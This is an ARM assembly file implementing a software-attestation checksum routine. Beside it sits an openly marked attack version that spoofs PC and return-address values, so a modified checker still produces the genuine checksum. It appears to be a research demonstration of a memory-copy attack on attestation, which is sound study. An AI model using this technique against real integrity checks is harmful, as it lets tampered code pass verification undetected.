/* checkfn_asm_bad.S
 *  by Alex Chadwick
 *
 * Implementation in ARM assembly of the core checking function.
 */

/*! ATTACK lines indicated in comments like this. */

/*! This attack involves verifying the real code from a modified checkfn. The
 *! idea is the modified checkfn could then restore malicious modifications
 *! after the check is concluded. Due to the nature of the protocol, it's
 *! reasonable to assume the code would have enough warning to have removed
 *! modifications before the protocl beigns. */

/* register usage:
 * r0-r7 C_j to C_{j-7} the checksum value.
 * r8 i - loop counter.
 * r9 x - value of T-function.
 * r10 l_c - base address of checked code.
 * r11 d - working address for data.
 * r12 temp.
 * r13 [sp] p2szm32 33 - log_2(size)  where size is size of checked code. */
	Cj0 .req r0
	Cj1 .req r7
	Cj2 .req r6
	Cj3 .req r5
	Cj4 .req r4
	Cj5 .req r3
	Cj6 .req r2
	Cj7 .req r1
	i .req r8
	x .req r9
	l .req r10
	d .req r11
	tmp .req r12
	p2szm32 .req r13

/* checkfn obeys ABI calling convention. The first argument is the number of
 * iterations, the second argument is a pointer to C0-C7 (the seed), the third
 * argument is a pointer to the (location, 32 - log(size)) pairs of dependant
 * code regions and the fourth argument is the number of dependant code
 * regions.
 *
 * The function has no defined return value.
 */
.section .text.checkfn_asm
.align 10
.globl checkfn_asm_body
checkfn_asm_body:
	nop
.align 9
	nop
.align 8
.globl checkfn_asm
checkfn_asm:
	push {r4,r5,r6,r7,r8,r9,r10,r11,lr}

	mrs r4,CPSR
	mrc p15,0,r5,c1,c0,0
	push {r4,r5}

	/* clear all status flags (C,Z,V,Q,GE) */
	bic r4,r4,#0xf9000000
	bic r4,r4,#0x000f0000
	/* clear all control bits (J,T,I,F,A) */
	bic r4,r4,#0x000003e0
	/* clear mode bits */
	bic r4,r4,#0x0000001f
	/* set I and F bits disabling IRQ and FIQ */
	orr r4,r4,#0x000000c0
	/* set mode to supervisor */
	orr r4,r4,#0x00000013
	msr CPSR_all,r4

	/* clear U, legacy alignment mode bit */
	bic r5,r5,#0x00400000
	mcr p15,0,r5,c1,c0,0

	push {r0,r1,r2,r3}
	lsl i,r0,#3
	ldm r1,{Cj0,Cj7,Cj6,Cj5,Cj4,Cj3,Cj2,Cj1}
	mov x,#0/*lr*/
	mov d,#0
	ldr lr,=Lcase1-0x10
	ldr l,=checkfn_asm_body
	ldr tmp,=sp_store
	str sp,[tmp]
	mov p2szm32,#21
	and tmp,Cj0,#0x30
	ldr tmp,[lr,tmp,LSR #2]
	bx  tmp

1:
	ldr tmp,=sp_store
	ldr sp,[tmp]
	pop {r8,r10,r11,r12}
	subs r12,r12,#1
	blt 3f

	add r11,#8
	push {r8,r10,r11,r12}
	lsl i,r8,#3
	ldr tmp,=sp_store
	str sp,[tmp]
	ldr l,[r11,#-8]
	ldr p2szm32,[r11,#-4]
	and tmp,Cj0,#0x30
	ldr tmp,[lr,tmp,LSR #2]
	mov d,#0
	bx  tmp
3:
	stm r10,{Cj0,Cj7,Cj6,Cj5,Cj4,Cj3,Cj2,Cj1}
	pop {r0,r1}
	pop {r4,r5,r6,r7,r8,r9,r10,r11}
	mcr p15,0,r1,c1,c0,0
	msr CPSR_all,r0
	pop {pc}

.align 10
Lcase0:
	/* case 0 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor Cj1,Cj7,Cj1,ROR #2
	add Cj1,Cj1,d
	eor tmp,Cj1,lr,ROR #4
	eor x,x,Cj0,ROR #28 /* x ^ (Cj0 <<< 4) */
	add Cj2,tmp,Cj2
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	eor Cj3,Cj2,Cj3,ROR #6
	add Cj3,Cj3,d
	ldr d,[d]
	eor Cj4,Cj3,Cj4,ROR #8
	mrs tmp,CPSR
Lpc0a:	add Cj4,Cj4,pc
	eor tmp,Cj4,tmp,ROR #10
	add Cj5,tmp,Cj5
	eor tmp,Cj5,Cj6,ROR #12
	add Cj6,tmp,d
	eor tmp,Cj6,Cj3,ROR #14
	add Cj7,tmp,Cj7
	eor tmp,Cj7,i,ROR #16
	subs i,i,#1
	add Cj0,tmp,Cj1
	and tmp,Cj0,#0x30
	eor Cj1,Cj1,lr
	ldr tmp,[lr,tmp,LSR #2]
	add Cj1,Cj1,d
	beq 1b
Lpc0b:	ldr d,[pc,x,ASR #22]
	blx tmp
Llr0:
	.int Lcase0
	.int Lcase1
	.int Lcase2
	.int Lcase3

Lcase1:
	/* case 1 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor Cj5,Cj3,lr,ROR #18
	add Cj5,Cj5,d
	eor Cj6,Cj5,Cj6,ROR #20
	eor x,x,Cj3,ROR #24 /* x ^ (Cj3 <<< 8) */
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	add Cj6,Cj6,d
	eor tmp,Cj6,Cj2,ROR #22
	add Cj7,tmp,Cj7
	mrs tmp,CPSR
	ldr d,[d]
	eor tmp,Cj7,tmp,ROR #24
	add Cj0,tmp,Cj0
	eor Cj1,Cj0,Cj1,ROR #26
	add Cj1,Cj1,Cj7
	eor tmp,Cj1,i,ROR #28
	add Cj2,tmp,Cj2
	and tmp,Cj0,#0x30
	eor Cj3,Cj2,Cj3,ROR #30
	ldr tmp,[lr,tmp,LSR #2]
	subs i,i,#1
	add Cj3,Cj3,d
	eor Cj4,Cj3,Cj5,ROR #4
	eor Cj3,Cj3,lr
	add Cj3,Cj3,d
Lpc1a:	add Cj4,Cj4,pc
	beq 1b
Lpc1b:	ldr d,[pc,x,ASR #22]
	blx tmp
Llr1:
	.int Lcase0
	.int Lcase1
	.int Lcase2
	.int Lcase3

Lcase2:
	/* case 2 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor Cj7,Cj5,Cj2,ROR #8
	add Cj7,Cj7,d
	eor tmp,Cj7,lr,ROR #12
	eor x,x,Cj4,ROR #20 /* x ^ (Cj4 <<< 12) */
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	add Cj0,tmp,Cj0
	eor tmp,Cj3,d,ROR #16
	ldr d,[d]
	add Cj5,tmp,Cj5
	mrs tmp,CPSR
	eor Cj6,Cj5,Cj7,ROR #20
	add Cj6,Cj6,tmp
	eor Cj3,Cj1,Cj3,ROR #24
	add Cj3,Cj3,d
	eor Cj4,Cj3,Cj5,ROR #28
Lpc2a:	add Cj4,Cj4,pc
	eor Cj1,Cj0,Cj1,ROR #2
	add Cj1,Cj1,Cj7
	eor tmp,Cj1,i,ROR #6
	subs i,i,#1
	add Cj2,tmp,Cj3
	and tmp,Cj0,#0x30
	eor Cj2,Cj2,lr
	ldr tmp,[lr,tmp,LSR #2]
	add Cj2,Cj2,d
	beq 1b
Lpc2b:	ldr d,[pc,x,ASR #22]
	blx tmp
Llr2:
	.int Lcase0
	.int Lcase1
	.int Lcase2
	.int Lcase3

Lcase3:
	/* case 3 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor tmp,lr,Cj6,ROR #10
	add tmp,tmp,d
	eor Cj7,Cj2,Cj5,ROR #14
	eor x,x,Cj6,ROR #16 /* x ^ (Cj6 <<< 16) */
	add Cj7,Cj7,tmp
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	eor Cj6,Cj7,Cj4,ROR #18
	add Cj6,Cj6,d
	ldr d,[d]
	eor Cj5,i,Cj3,ROR #22
	add Cj5,Cj5,Cj6
	eor Cj4,Cj5,Cj2,ROR #26
Lpc3a:	add Cj4,Cj4,pc
	eor Cj3,Cj4,Cj1,ROR #30
	add Cj3,Cj3,d
	eor Cj2,Cj3,Cj0,ROR #8
	eor Cj1,Cj7,tmp,ROR #16
	eor Cj0,tmp,lr
	add Cj0,Cj0,d
	mrs tmp,CPSR
	add Cj2,Cj2,tmp
	and tmp,Cj0,#0x30
	subs i,i,#1
	ldr tmp,[lr,tmp,LSR #2]
	add Cj1,Cj1,Cj2
	beq 1b
Lpc3b:	ldr d,[pc,x,ASR #21]
	blx tmp
Llr3:
	.int Lcase0
	.int Lcase1
	.int Lcase2
	.int Lcase3

/* Symbol for the end of checkfn. Used from C code to determine range. */
.align 10
.globl checkfn_asm_body_end
checkfn_asm_body_end:

/*! Replicate the checkfn with modification. */
	nop
.align 9
	nop
.align 8
.globl checkfn_asm_bad
checkfn_asm_bad:
	push {r4,r5,r6,r7,r8,r9,r10,r11,lr}

	mrs r4,CPSR
	mrc p15,0,r5,c1,c0,0
	push {r4,r5}

	/* clear all status flags (C,Z,V,Q,GE) */
	bic r4,r4,#0xf9000000
	bic r4,r4,#0x000f0000
	/* clear all control bits (J,T,I,F,A) */
	bic r4,r4,#0x000003e0
	/* clear mode bits */
	bic r4,r4,#0x0000001f
	/* set I and F bits disabling IRQ and FIQ */
	orr r4,r4,#0x000000c0
	/* set mode to supervisor */
	orr r4,r4,#0x00000013
	msr CPSR_all,r4

	/* clear U, legacy alignment mode bit */
	bic r5,r5,#0x00400000
	mcr p15,0,r5,c1,c0,0

	push {r0,r1,r2,r3}
	lsl i,r0,#3
	ldm r1,{Cj0,Cj7,Cj6,Cj5,Cj4,Cj3,Cj2,Cj1}
	mov x,#0/*lr*/
	mov d,#0
	ldr lr,=Lcase1-0x10
	ldr l,=checkfn_asm_body
	ldr tmp,=sp_store
	str sp,[tmp]
	mov p2szm32,#21
	and tmp,Cj0,#0x30
	ldr tmp,[pc,tmp,LSR #2]
	bx  tmp
	.int Lecase0
	.int Lecase1
	.int Lecase2
	.int Lecase3

1:
	ldr tmp,=sp_store
	ldr sp,[tmp]
	pop {r8,r10,r11,r12}
	subs r12,r12,#1
	blt 3f

	add r11,#8
	push {r8,r10,r11,r12}
	lsl i,r8,#3
	ldr tmp,=sp_store
	str sp,[tmp]
	ldr l,[r11,#-8]
	ldr p2szm32,[r11,#-4]
	and tmp,Cj0,#0x30
	ldr tmp,[pc,tmp,LSR #2]
	mov d,#0
	bx  tmp
	.int Lecase0
	.int Lecase1
	.int Lecase2
	.int Lecase3
3:
	stm r10,{Cj0,Cj7,Cj6,Cj5,Cj4,Cj3,Cj2,Cj1}
	pop {r0,r1}
	pop {r4,r5,r6,r7,r8,r9,r10,r11}
	mcr p15,0,r1,c1,c0,0
	msr CPSR_all,r0
	pop {pc}

Ltbl:
	.int Lecase0
	.int Lecase1
	.int Lecase2
	.int Lecase3
.align 10
Lecase0:
	/* case 0 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor Cj1,Cj7,Cj1,ROR #2
	add Cj1,Cj1,d
	eor tmp,Cj1,lr,ROR #4
	eor x,x,Cj0,ROR #28 /* x ^ (Cj0 <<< 4) */
	add Cj2,tmp,Cj2
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	eor Cj3,Cj2,Cj3,ROR #6
	add Cj3,Cj3,d
	ldr d,[d]
	eor Cj4,Cj3,Cj4,ROR #8
	mrs tmp,CPSR
Lepc0a:	add Cj4,Cj4,pc
	add Cj4,#Lpc0a-Lepc0a
	eor tmp,Cj4,tmp,ROR #10
	add Cj5,tmp,Cj5
	eor tmp,Cj5,Cj6,ROR #12
	add Cj6,tmp,d
	eor tmp,Cj6,Cj3,ROR #14
	add Cj7,tmp,Cj7
	eor tmp,Cj7,i,ROR #16
	subs i,i,#1
	add Cj0,tmp,Cj1
	and tmp,Cj0,#0x30
	eor Cj1,Cj1,lr
	ldr lr,=Ltbl
	ldr tmp,[lr,tmp,LSR #2]
	add Cj1,Cj1,d
	beq 1b
Lepc0b:	add d,pc,x,ASR #22
	ldr d,[d,#Lpc0b-Lepc0b]
	ldr lr,=Llr0
	bx tmp

Lecase1:
	/* case 1 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor Cj5,Cj3,lr,ROR #18
	add Cj5,Cj5,d
	eor Cj6,Cj5,Cj6,ROR #20
	eor x,x,Cj3,ROR #24 /* x ^ (Cj3 <<< 8) */
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	add Cj6,Cj6,d
	eor tmp,Cj6,Cj2,ROR #22
	add Cj7,tmp,Cj7
	mrs tmp,CPSR
	ldr d,[d]
	eor tmp,Cj7,tmp,ROR #24
	add Cj0,tmp,Cj0
	eor Cj1,Cj0,Cj1,ROR #26
	add Cj1,Cj1,Cj7
	eor tmp,Cj1,i,ROR #28
	add Cj2,tmp,Cj2
	and tmp,Cj0,#0x30
	eor Cj3,Cj2,Cj3,ROR #30
	subs i,i,#1
	add Cj3,Cj3,d
	eor Cj4,Cj3,Cj5,ROR #4
	eor Cj3,Cj3,lr
	ldr lr,=Ltbl
	ldr tmp,[lr,tmp,LSR #2]
Lepc1a:	add Cj4,Cj4,pc
	add Cj3,Cj3,d
	add Cj4,#Lpc1a-Lepc1a
	beq 1b
Lepc1b:	add d,pc,x,ASR #22
	ldr d,[d,#Lpc1b-Lepc1b]
	ldr lr,=Llr1
	bx tmp

Lecase2:
	/* case 2 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor Cj7,Cj5,Cj2,ROR #8
	add Cj7,Cj7,d
	eor tmp,Cj7,lr,ROR #12
	eor x,x,Cj4,ROR #20 /* x ^ (Cj4 <<< 12) */
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	add Cj0,tmp,Cj0
	eor tmp,Cj3,d,ROR #16
	ldr d,[d]
	add Cj5,tmp,Cj5
	mrs tmp,CPSR
	eor Cj6,Cj5,Cj7,ROR #20
	add Cj6,Cj6,tmp
	eor Cj3,Cj1,Cj3,ROR #24
	add Cj3,Cj3,d
	eor Cj4,Cj3,Cj5,ROR #28
Lepc2a:	add Cj4,Cj4,pc
	add Cj4,#Lpc2a-Lepc2a
	eor Cj1,Cj0,Cj1,ROR #2
	add Cj1,Cj1,Cj7
	eor tmp,Cj1,i,ROR #6
	subs i,i,#1
	add Cj2,tmp,Cj3
	and tmp,Cj0,#0x30
	eor Cj2,Cj2,lr
	ldr lr,=Ltbl
	ldr tmp,[lr,tmp,LSR #2]
	add Cj2,Cj2,d
	beq 1b
Lepc2b:	add d,pc,x,ASR #22
	ldr d,[d,#Lpc2b-Lepc2b]
	ldr lr,=Llr2
	bx tmp

Lecase3:
	/* case 3 */
	orr tmp,x,#5
	mlas x,tmp,tmp,x /* x + (x | 5)^2 */
	eor tmp,lr,Cj6,ROR #10
	add tmp,tmp,d
	eor Cj7,Cj2,Cj5,ROR #14
	eor x,x,Cj6,ROR #16 /* x ^ (Cj6 <<< 16) */
	add Cj7,Cj7,tmp
	add d,l,x,LSR p2szm32 /* l + x[31:p2szm32] */
	eor Cj6,Cj7,Cj4,ROR #18
	add Cj6,Cj6,d
	ldr d,[d]
	eor Cj5,i,Cj3,ROR #22
	add Cj5,Cj5,Cj6
	eor Cj4,Cj5,Cj2,ROR #26
Lepc3a:	add Cj4,Cj4,pc
	add Cj4,#Lpc3a-Lepc3a
	eor Cj3,Cj4,Cj1,ROR #30
	add Cj3,Cj3,d
	eor Cj2,Cj3,Cj0,ROR #8
	eor Cj1,Cj7,tmp,ROR #16
	eor Cj0,tmp,lr
	add Cj0,Cj0,d
	mrs tmp,CPSR
	add Cj2,Cj2,tmp
	ldr lr,=Ltbl
	and tmp,Cj0,#0x30
	subs i,i,#1
	ldr tmp,[lr,tmp,LSR #2]
	add Cj1,Cj1,Cj2
	beq 1b
Lepc3b:	add d,pc,x,ASR #21
	ldr d,[d,#Lpc3b-Lepc3b]
	ldr lr,=Llr3
	bx tmp

/* Location used to store the stack pointer while the checksum is running. */
.section .bss.sp_store
.align 2
sp_store:
	.int 0
